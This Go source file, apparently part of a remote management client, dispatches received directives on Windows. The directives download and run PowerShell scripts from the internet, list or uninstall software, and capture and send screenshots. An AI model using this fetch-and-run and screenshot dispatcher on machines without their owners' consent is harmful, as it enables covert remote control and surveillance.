//go:build windows

package handler

import (
	c "corpotecht_client/common"
	"corpotecht_client/crossplatform"
	"corpotecht_client/utils"
	"corpotecht_client/windows"
	"log"
)

func HandleDirective(directive c.Directive) {
	defer utils.RecoverFromCrash()

	switch directive.Command {
	case "powershell":
		if len(directive.Parameters) > 0 {
			windows.ExecutePowershellScriptFromInternet(directive.Parameters[0])
		} else {
			log.Println("Invalid directive received.")
		}

	case "listsoftware":
		windows.GetInstalledSoftware()
	case "uninstall":
		windows.UninstallSoftware(directive.Parameters)
	case "screenshot":
		crossplatform.TakeAndSendScreenshot()

	}
}
